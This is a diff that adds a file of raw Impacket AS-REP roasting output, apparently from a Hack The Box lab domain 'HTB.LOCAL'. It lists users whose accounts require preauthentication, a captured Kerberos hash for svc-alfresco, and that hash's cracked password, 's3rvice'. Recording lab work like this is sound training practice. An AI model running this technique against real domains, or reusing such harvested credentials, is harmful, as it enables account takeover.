@@ -1,0 +1,13 @@
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$svc-alfresco@HTB.LOCAL:8eb43754305c9ccd9966fb4fef05948a$d2e163e6ec8dffd35d9084870222f2064d2b579c4662b265065c4c6acd70c2c328f21b2b09de3433535d5edd583f0d9013ddbfec764351a7c4594fd9aeb69e8b5d405101fe5433b46ff575edd75d6d2408053f32226402bda4db01f6f6122b998a01f17123a08954c19fdc924d78184eb8cbe22ecd72bcb7a326f9f44813a528212e8acf73672670289ba7febd95c20c89fa5c3c6336efe5e340737ef4b375b4951895923aece4bd9f9e2cab3adf6b4cdc1dbadade912d0676e4758463c59a303b110bfd012015ef4555249457166a167195d006a9edae137d88807bdb9ef7626d31a8e1ee01
+svc-alfresco:s3rvice
